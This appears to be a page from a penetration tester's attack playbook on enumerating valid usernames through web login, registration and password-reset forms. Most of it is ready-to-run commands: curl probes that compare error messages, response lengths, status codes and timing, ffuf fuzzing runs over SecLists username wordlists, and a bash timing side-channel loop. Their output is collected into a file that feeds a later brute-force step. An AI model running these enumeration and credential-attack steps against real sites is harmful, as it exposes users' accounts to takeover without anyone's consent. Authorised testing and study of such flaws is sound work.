
Enumerate valid usernames via differential response on auth-adjacent forms. Output populates `users_<host>.txt` for consumption by [[Credential Attacks]] Section 5 (enum-fed brute force) triggered from [[Web Attack Checksheet]] sub-block 1.14.

Entry from [[Web Attack Checksheet]]:
- Sub-block 1.6 (login form present) — login-differential enumeration
- Sub-block 1.7 (register form present) — username-taken enumeration
- Sub-block 1.8 (forgot-password form present) — email-sent-differential enumeration
- [[IDOR]] technique file (cross-route) — user-record enumeration via URL parameter

Also entered opportunistically from any newly-discovered auth-adjacent form (gobuster hit routed via re-apply mechanism, subdomain recursion).

Ordering: fastest signal detection first (each form-type probe is 2 curl requests); enumeration attack against whichever signal detected; timing-based enumeration as fallback if no message differential.

---

## Users accumulator convention

Any valid username enumerated by any section below appends to `users_<host>.txt`:

`echo '<username>' >> users_<host>.txt`

De-duplicate periodically: `sort -u users_<host>.txt -o users_<host>.txt`.

---

## 1. Signal detection

Determine which form(s) leak username validity. Send one known-invalid + one plausible username per form type; diff responses.

### 1.1 Login form differential (from WAC sub-block 1.6)

```bash
echo "--- invalid username ---"
curl -sX POST -i -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>
echo ""
echo "--- plausible username ---"
curl -sX POST -i -d 'username=admin&password=wrong' http://<host>:<port>/<login_path>
```

Compare responses. Signal is one of:

- Different error message text (e.g. `User not found` vs `Password incorrect`)
- Different response length (`Content-Length` header or body byte count)
- Different HTTP status code
- Different response time (>500ms delta suggests server does DB lookup only for valid users — feed to Section 5)

Route:

- Message text differs → 2 (enumeration attack, use unique-to-valid message as match string)
- Length differs → 2 (use length as filter)
- Status differs → 2 (use status as filter)
- Time differs by >500ms → 5 (timing-based enumeration)
- All responses identical → no login-form signal; 1.2

### 1.2 Register form differential (from WAC sub-block 1.7)

```bash
echo "--- invalid username (should register successfully) ---"
curl -sX POST -i -d 'username=xyzabc123xxx&email=x@x.com&password=Pass1234&cpassword=Pass1234' http://<host>:<port>/<signup_path>
echo ""
echo "--- taken username (should fail) ---"
curl -sX POST -i -d 'username=admin&email=y@x.com&password=Pass1234&cpassword=Pass1234' http://<host>:<port>/<signup_path>
```

Signal: response for taken usernames differs from response for available usernames. Typical messages: `Username already exists`, `Account with this username exists`, `This username is not available`.

Route:

- Message text differs → 3 (enumeration attack)
- Length or status differs → 3
- All responses identical → no register-form signal; 1.3

### 1.3 Forgot-password form differential (from WAC sub-block 1.8)

```bash
echo "--- invalid username ---"
curl -sX POST -i -d 'username=xyzabc123xxx' http://<host>:<port>/<reset_path>
echo ""
echo "--- plausible username ---"
curl -sX POST -i -d 'username=admin' http://<host>:<port>/<reset_path>
```

Signal: response for valid usernames differs from invalid. Typical messages: `Email sent` vs `User not found`, `Reset link sent` vs `No account found`.

**Security-aware apps deliberately return identical responses** ("If an account with this email exists, a reset link has been sent") — no signal from message text. Fall back to length/status/timing:

- Response length differs → 4
- Response time differs by >500ms → 5

Route:

- Any differential detected → 4 (enumeration attack)
- All responses identical → no forgot-password signal; if 1.1 and 1.2 also empty, no enumeration possible on this target — return to WAC without appending to `users_<host>.txt`

---

## 2. Enumeration attack — login form

Fuzz username field with fixed invalid password. Filter by the signal identified in 1.1.

**If message-text signal:**

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -mr '<valid_user_message>' -o found_users_login.csv -of csv`

Where `<valid_user_message>` = the message unique to valid usernames (e.g. `Password incorrect`).

**If length signal (filter by content-length):**

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fs <invalid_length> -o found_users_login.csv -of csv`

Where `<invalid_length>` = the response length for invalid usernames. `-fs` filters those out, leaving only differential responses (valid users).

**If status signal (filter by status code):**

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fc <invalid_status> -o found_users_login.csv -of csv`

**Extract and append to accumulator:**

```bash
cut -d ',' -f1 found_users_login.csv | grep -v '^input' >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route:

- `users_<host>.txt` populated → 6 (post-enum routing)
- Empty (all fuzz attempts filtered) → wordlist may be wrong; try larger list (`/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt`), then 6

---

## 3. Enumeration attack — register form

Fuzz username field on sign-up form. Filter by "username taken" signal.

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&email=x@x.com&password=Pass1234&cpassword=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<signup_path> -mr '<username_taken_message>' -o found_users_register.csv -of csv`

**Extract and append:**

```bash
cut -d ',' -f1 found_users_register.csv | grep -v '^input' >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route: same as Section 2.

---

## 4. Enumeration attack — forgot-password form

Fuzz username field. Filter by valid-user signal (message, length, or status).

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<reset_path> -mr '<valid_user_signal>' -o found_users_reset.csv -of csv`

Adjust `-mr` / `-fs` / `-fc` flag per detected signal type (as in Section 2).

**Extract and append:**

```bash
cut -d ',' -f1 found_users_reset.csv | grep -v '^input' >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route: same as Section 2.

---

## 5. Timing-based enumeration (fallback)

When no message/length/status differential exists but response time differs (server does DB lookup only for valid users), enumerate via timing side-channel.

**Baseline timing measurement:**

```bash
for u in xyzabc123xxx admin; do
  echo "--- $u ---"
  for i in $(seq 1 5); do
    curl -sX POST -o /dev/null -w '%{time_total}\n' -d "username=$u&password=wrong" http://<host>:<port>/<login_path>
  done
done
```

Compute median for invalid vs plausible. If plausible-user median > invalid-user median by >200ms consistently, timing side-channel viable.

**Enumeration attack:** ffuf doesn't handle timing well; use a bash loop:

```bash
while read u; do
  t=$(curl -sX POST -o /dev/null -w '%{time_total}' -d "username=$u&password=wrong" http://<host>:<port>/<login_path>)
  awk -v t="$t" 'BEGIN{ if (t+0 > 0.200) exit 0; else exit 1}' && echo "$u" >> users_<host>.txt
done < /usr/share/seclists/Usernames/Names/names.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Timing threshold (`0.200` = 200ms) tuned to observed differential. Adjust per target.

⚠️ Timing enum is noisy and slow — network jitter causes false positives. Manually verify final list before feeding to Section 6.

Route: 6.

---

## 6. Post-enumeration routing

Once `users_<host>.txt` is populated:

1. Log to `route_<ip>.txt`:

    `printf '[Username Enumeration] APPLIED: %d valid usernames enumerated on <host>:<port>\n' $(wc -l < users_<host>.txt) >> route_<ip>.txt`

2. Route:

- Continue current [[Web Attack Checksheet]] Step 1 walk — sub-block 1.14 (credential attack with enumerated usernames) will fire later in the walk and consume `users_<host>.txt`
- If already at sub-block 1.14 when this file completes → sub-block 1.14 fires immediately with populated list
- If entered from [[IDOR]] technique file (cross-route from URL params enumeration) → return to IDOR to continue any remaining IDOR work, then normal WAC walk continues

---

## Exhaustion

No forms with enumeration signals detected AND timing-based enum inconclusive → target does not leak username validity. Return to [[Web Attack Checksheet]] without appending to `users_<host>.txt`. Sub-block 1.14 will not fire (precondition unmet) and walk continues past it.
